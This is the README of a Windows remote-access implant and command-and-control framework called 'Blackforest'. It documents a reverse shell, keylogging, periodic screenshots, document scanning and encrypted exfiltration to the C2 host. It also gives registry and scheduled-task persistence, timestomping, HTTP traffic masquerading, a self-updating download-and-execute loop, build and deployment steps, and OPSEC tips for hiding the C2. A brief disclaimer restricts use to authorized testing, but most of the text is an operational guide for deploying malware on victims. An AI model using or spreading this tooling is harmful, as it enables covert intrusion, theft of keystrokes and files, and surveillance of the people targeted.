# Blackforest 🌲
**Advanced Persistent Threat (APT) Framework - Level 5 Architecture**

A professional-grade Windows agent with military-level security, cryptographically-signed auto-updates, and multi-channel command & control capabilities.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Features](#features)
- [Quick Start](#quick-start)
- [Technical Details](#technical-details)
- [Security](#security)
- [Development](#development)
- [Troubleshooting](#troubleshooting)
- [License](#license)

---

## 🎯 Overview

Blackforest is a cross-platform APT framework featuring:

- **Zero-Click Deployment**: Automated persistence mechanisms
- **Encrypted C2**: RC4-encrypted data channels with HTTP masquerading
- **RSA-Signed Updates**: 2048-bit cryptographic update authentication
- **Multi-Channel Exfiltration**: Keylogging, screenshots, file scanning, system recon
- **Production-Ready**: Battle-tested auto-update infrastructure

### Use Cases

- Red team operations
- Security research
- Penetration testing
- Educational purposes (authorized environments only)

---

## 🏗️ Architecture

### System Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                     VICTIM MACHINE (Windows)                 │
│                                                              │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  Blackforest.exe (13.3 MB)                           │  │
│  │  ────────────────────────────────────────────────────│  │
│  │  • Persistence: Registry + Scheduled Task            │  │
│  │  • Keylogger: Real-time capture                      │  │
│  │  • Screenshot: 30s intervals                         │  │
│  │  • File Scanner: Documents/Downloads                 │  │
│  │  • Auto-Updater: 60s polling                         │  │
│  │  • RSA Verifier: Embedded public key                 │  │
│  └──────────────────────────────────────────────────────┘  │
│                          │                                   │
│                          │ RC4 Encrypted + HTTP Headers      │
│                          ▼                                   │
└─────────────────────────────────────────────────────────────┘
                           │
                  ┌────────┼────────┐
                  │                 │
        Port 4445 │       Port 4444 │       Port 8000
    (Reverse Shell)   (Data Channel)   (Auto-Update)
                  │                 │           │
                  ▼                 ▼           ▼
┌─────────────────────────────────────────────────────────────┐
│                    C2 SERVER (Mac/Linux)                      │
│                                                              │
│  ┌───────────────┐  ┌──────────────┐  ┌─────────────────┐  │
│  │  server.py    │  │ HTTP Server  │  │ RSA Signer      │  │
│  │  ────────────│  │ ──────────── │  │ ───────────────│  │
│  │  • Shell      │  │ • Serves EXE │  │ • Private Key   │  │
│  │  • Data       │  │ • update.txt │  │ • Signs updates │  │
│  │  • Decrypt    │  │ • update.sig │  │ • 2048-bit RSA  │  │
│  └───────────────┘  └──────────────┘  └─────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

### Component Breakdown

| Component | Technology | Purpose |
|-----------|-----------|---------|
| **Agent** | C++ (Windows API) | Main payload, runs on victim |
| **C2 Server** | Python 3 | Command & control, data receiver |
| **Updater** | HTTP + RSA | Passwordless auto-deployment |
| **Encryption** | RC4 + RSA-2048 | Data protection & authentication |
| **Persistence** | Registry + Task Scheduler | Survival across reboots |

---

## ✨ Features

### Core Capabilities

#### 1. **Reverse Shell** 🖥️
- Full cmd.exe access
- Interactive command execution
- Multi-session support
- Background/foreground switching

#### 2. **Keylogger** ⌨️
- Real-time keystroke capture
- Window title tracking
- Logged to `c2/blackforest_logs.txt`
- Silent operation (no UI)

#### 3. **Screenshot Capture** 📸
- Automatic screen capture every 30 seconds
- JPEG compression
- Saved as `c2/screenshot_IP_TIMESTAMP.jpg`
- GDI+ rendering

#### 4. **File Scanner** 📁
- Monitors `Documents` and `Downloads`
- Targets: `.txt`, `.pdf`, `.doc`, `.docx`, `.key`
- Reports file paths to C2
- Scheduled background scans

#### 5. **Auto-Update** 🔄
- **Passwordless**: No SSH, no credentials
- **Cryptographically Signed**: RSA-2048 signature verification
- **Automatic**: Downloads, verifies, replaces itself
- **Polling**: Checks every 60 seconds
- **Secure**: Rejects tampered binaries

### Security Features

#### Encryption
- **RC4 Data Encryption**: All exfiltrated data encrypted
- **HTTP Masquerading**: Traffic looks like legitimate HTTP
- **RSA Signature Verification**: Only signed updates accepted

#### Evasion
- **Process Hiding**: No console window (`-mwindows`)
- **Timestomping**: Randomized file timestamps
- **HTTP Headers**: Mimics browser traffic
- **No Disk Artifacts**: Minimal forensic footprint

#### Persistence
- **Registry Run Key**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- **Scheduled Task**: Daily execution at login
- **Auto-Installation**: Copies self to `%APPDATA%\Blackforest\`

---

## 🚀 Quick Start

### Prerequisites

**C2 Server (Mac/Linux):**
- Python 3.7+
- `cryptography` module: `pip3 install cryptography`

**Build Environment:**
- MinGW-w64 cross-compiler: `brew install mingw-w64`
- macOS (for cross-compilation)

### Installation

```bash
# 1. Clone repository
git clone https://github.com/yourusername/blackforest.git
cd blackforest

# 2. Install Python dependencies
pip3 install cryptography --break-system-packages

# 3. Generate RSA keypair
python3 c2/generate_keys.py

# 4. Build agent
scripts/build.sh

# 5. Sign binary
python3 c2/sign_update.py Blackforest.exe
cp bin/Blackforest.exe .

# 6. Start C2 server
python3 c2/server.py &

# 7. Start HTTP update server
python3 -m http.server 8000 &

# 8. Deploy to victim (one-time manual)
scripts/deploy.sh
```

### Basic Usage

```bash
# Start C2 server
cd c2
python3 server.py

# Wait for connection
# [+] New Shell Session (0) from 192.168.0.6

# List sessions
C2> list

# Interact with agent
C2> interact 0

# Run Windows commands
PS> whoami
PS> systeminfo
PS> ipconfig

# Return to C2 menu
PS> back

# Exit
C2> exit
```

### Updating the Agent

```bash
# 1. Make code changes (optional)
# 2. Rebuild
scripts/build.sh

# 3. Sign
python3 c2/sign_update.py Blackforest.exe

# 4. Copy to web root
cp bin/Blackforest.exe .

# 5. Wait 60 seconds - agent auto-updates!
```

---

## 🔬 Technical Details

### File Structure

```
blackforest/
├── README.md                    # This file
├── .gitignore                   # Git exclusions
├── Blackforest.exe              # HTTP-served update binary
├── update.sig                   # RSA signature (256 bytes)
├── update.txt                   # Update authorization key
├── blackforest_private.pem      # RSA private key (KEEP SECRET!)
├── blackforest_public.blob      # RSA public key (raw bytes)
├── blackforest_public.blob.cpp  # RSA public key (C++ array)
│
├── bin/
│   └── Blackforest.exe          # Compiled agent binary
│
├── c2/
│   ├── server.py                # Unified C2 server
│   ├── generate_keys.py         # RSA keypair generator
│   ├── sign_update.py           # Binary signing tool
│   ├── blackforest_logs.txt     # Exfiltrated data (auto-created)
│   └── screenshot_*.jpg         # Captured screenshots (auto-created)
│
├── scripts/
│   ├── build.sh                 # Cross-compiler script
│   ├── deploy.sh                # Interactive SSH deployment
│   └── check_agent.sh           # Diagnostic tool
│
├── src/                         # C++ source code
│   ├── main.cpp                 # Entry point
│   ├── core/
│   │   ├── collection/          # Data gathering
│   │   │   ├── file_search.cpp
│   │   │   ├── keylogger.cpp
│   │   │   ├── screenshot.cpp
│   │   │   └── sysinfo.cpp
│   │   ├── evasion/             # Anti-forensics
│   │   │   ├── http_masquerade.cpp
│   │   │   └── timestomp.cpp
│   │   ├── maintenance/         # Lifecycle management
│   │   │   └── updater.cpp
│   │   └── persistence/         # Survival mechanisms
│   │       ├── install.cpp
│   │       └── scheduled_task.cpp
│   ├── crypto/                  # Cryptography
│   │   ├── rc4.cpp
│   │   └── rsa.cpp
│   ├── exfil/                   # Data exfiltration
│   │   ├── beacon.cpp
│   │   └── tcp_client.cpp
│   └── obfuscation/             # Stealth
│       └── strings.cpp
│
└── include/                     # Header files (.hpp)
    └── (mirrors src/ structure)
```

### Network Protocols

#### Port 4445: Reverse Shell
- **Protocol**: TCP
- **Encryption**: None (local network)
- **Format**: Raw PowerShell I/O
- **Usage**: Interactive command execution

#### Port 4444: Data Exfiltration
- **Protocol**: TCP
- **Encryption**: RC4 (`0xDEADBEEFCAFEBABE`)
- **Format**: HTTP POST with headers
- **Data Types**:
  - `[KEYLOG]`: Keystroke data
  - `[SCREENSHOT]`: Base64-encoded JPEG
  - `[HEARTBEAT]`: Status beacon
  - `[DOCS_FOUND]`: File scan results

#### Port 8000: Auto-Update
- **Protocol**: HTTP
- **Encryption**: None (RSA signature for integrity)
- **Files Served**:
  - `update.txt`: Authorization key (64 hex chars)
  - `Blackforest.exe`: New agent binary
  - `update.sig`: RSA-SHA1 signature (256 bytes)

### Cryptography

#### RC4 Stream Cipher
```cpp
Key: 0xDEADBEEFCAFEBABE (64-bit)
Usage: Data channel encryption (Port 4444)
Implementation: Windows CryptoAPI
```

#### RSA-2048 Digital Signatures
```cpp
Algorithm: PKCS#1 v1.5 with SHA-1
Key Size: 2048 bits
Private Key: blackforest_private.pem (PEM format)
Public Key: Embedded in binary (PUBLICKEYBLOB format)
Signature Size: 256 bytes
```

**Signature Workflow:**
1. C2 hashes `Blackforest.exe` with SHA-1
2. C2 signs hash with private key → `update.sig`
3. Agent downloads both files
4. Agent verifies signature with embedded public key
5. If valid → Execute update
6. If invalid → Delete and abort

### Update Mechanism

**Agent Side (updater.cpp):**
```cpp
while(running) {
    // 1. Check authorization
    if (download("http://C2:8000/update.txt") == UPDATE_KEY) {
        
        // 2. Download new binary + signature
        download("http://C2:8000/Blackforest.exe");
        download("http://C2:8000/update.sig");
        
        // 3. Verify RSA signature
        if (RSA::VerifySignature(exe_data, sig_data, PUBLIC_KEY)) {
            
            // 4. Replace current process
            create_batch_script("del old.exe && ren new.exe old.exe && old.exe");
            exec_batch();
            exit();
        }
    }
    sleep(60000); // 60 seconds
}
```

**C2 Side:**
```bash
# Sign update
python3 c2/sign_update.py Blackforest.exe

# Copy to web root
cp bin/Blackforest.exe .

# HTTP server auto-serves files
```

### Data Flow

**Keylog Capture:**
```
User Types → GetAsyncKeyState() → RC4 Encrypt → HTTP POST → C2 Decrypt → Log File
```

**Screenshot Capture:**
```
GDI+ → Capture Desktop → JPEG Encode → RC4 Encrypt → HTTP POST → C2 Decrypt → Save JPG
```

**File Scanner:**
```
Enumerate Directories → Match Extensions → Build List → RC4 Encrypt → HTTP POST → C2 Log
```

### Persistence Implementation

**Registry Auto-Run:**
```cpp
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
Value: "BlackforestUpdater"
Data: "%APPDATA%\Blackforest\Blackforest.exe"
```

**Scheduled Task:**
```xml
<Task>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>%APPDATA%\Blackforest\Blackforest.exe</Command>
    </Exec>
  </Actions>
</Task>
```

---

## 🔐 Security

### Threat Model

**Protections:**
- ✅ Network tampering (RSA signatures)
- ✅ Data interception (RC4 encryption)
- ✅ Malware injection (signature verification)
- ✅ Forensic analysis (timestomping, HTTP masq)

**Out of Scope:**
- ⚠️ Kernel-level AV/EDR (user-mode only)
- ⚠️ Network traffic analysis (metadata visible)
- ⚠️ Memory forensics (running process)

### Best Practices

1. **Private Key Security**: Never commit `blackforest_private.pem` to Git
2. **Update Authorization**: Change `update.txt` key after deployment
3. **Network Segmentation**: Use isolated C2 infrastructure
4. **Logging**: Rotate `blackforest_logs.txt` regularly
5. **Testing**: Only deploy in authorized environments

### OPSEC Considerations

- Change RC4 key before deployment
- Modify HTTP User-Agent strings
- Randomize update polling intervals
- Use VPN/proxy for C2 server
- Encrypt C2 logs at rest

---

## 👩‍💻 Development

### Building from Source

```bash
# Cross-compile for Windows (from Mac/Linux)
x86_64-w64-mingw32-g++ \
    -std=c++17 \
    -mwindows \
    -static \
    -I./include \
    -o bin/Blackforest.exe \
    src/**/*.cpp \
    -lws2_32 -lgdi32 -lgdiplus -lurlmon -lwininet -lcrypt32
```

### Adding Features

**Example: New Data Collection Module**

1. Create `src/core/collection/browser_history.cpp`
2. Add header `include/core/collection/browser_history.hpp`
3. Implement `BrowserHistory::Collect()` method
4. Call from `main.cpp`:
```cpp
#include "core/collection/browser_history.hpp"

std::thread browserThread(BrowserHistory::Collect);
```
5. Rebuild and deploy

### Code Style

- **Naming**: `PascalCase` for classes, `camelCase` for functions
- **Headers**: Use include guards (`#ifndef`, `#define`, `#endif`)
- **Error Handling**: Silent failures (no logs on victim)
- **Memory**: RAII, smart pointers where possible

### Testing

```bash
# Build
scripts/build.sh

# Start local C2
python3 c2/server.py &

# Run agent with debugger
wine bin/Blackforest.exe

# Monitor logs
tail -f c2/blackforest_logs.txt
```

---

## 🐛 Troubleshooting

### Common Issues

#### No Connection to C2
**Symptom**: Agent doesn't connect to ports 4444/4445

**Solutions:**
1. Check firewall: `lsof -i :4444` and `lsof -i :4445`
2. Verify C2 IP in `src/main.cpp` (default: `192.168.0.3`)
3. Ensure server.py is running: `ps aux | grep server.py`

#### Encrypted/Garbled Logs
**Symptom**: `blackforest_logs.txt` shows gibberish

**Cause**: RC4 key mismatch

**Solution:**
1. Check key in `src/exfil/tcp_client.cpp` matches `c2/server.py`
2. Rebuild: `scripts/build.sh`
3. Redeploy: `scripts/deploy.sh`

#### Auto-Update Not Working
**Symptom**: Agent downloads but doesn't update

**Diagnostics:**
```bash
# Check HTTP server
lsof -i :8000

# Verify signature
python3 c2/sign_update.py Blackforest.exe

# Monitor update attempts
tail -f ../http_server.log | grep update
```

**Common Causes:**
- HTTP server not running
- Invalid RSA signature
- Wrong update authorization key

#### No Screenshots
**Symptom**: No `.jpg` files in `c2/`

**Solutions:**
1. Wait 30 seconds for first capture
2. Verify GDI+ is available on victim
3. Check permissions on `c2/` directory

### Debug Mode

Rebuild with console output for debugging:

```bash
# Edit scripts/build.sh
# Remove: -mwindows
# Add: -DDEBUG

scripts/build.sh
```

Run with visible console:
```powershell
.\Blackforest.exe
```

---

## 📜 License

**Educational Use Only**

This software is provided for educational, research, and authorized security testing purposes only.

**You are responsible for:**
- Obtaining explicit written authorization before deployment
- Complying with all applicable laws and regulations
- Using this software ethically and legally

**Unauthorized use is prohibited** and may violate:
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK
- Convention on Cybercrime (Budapest Convention) - Europe
- Local cybersecurity laws

The authors assume no liability for misuse.

---

## 🙏 Acknowledgments

- **MinGW-w64 Project**: Cross-platform compilation
- **Python Cryptography**: RSA implementation
- **Windows CryptoAPI**: RC4 encryption
- **GDI+**: Screenshot capture

---

## 📞 Support

**For Issues:**
- Open an issue on GitHub
- Include logs from `c2/blackforest_logs.txt`
- Describe your environment (OS, Python version, etc.)

**For Feature Requests:**
- Fork the repository
- Create a pull request
- Document changes in commit messages

---

**Built with 🌲 by the Blackforest Team**

*"Silent as the forest, persistent as the roots, invisible as the wind."*
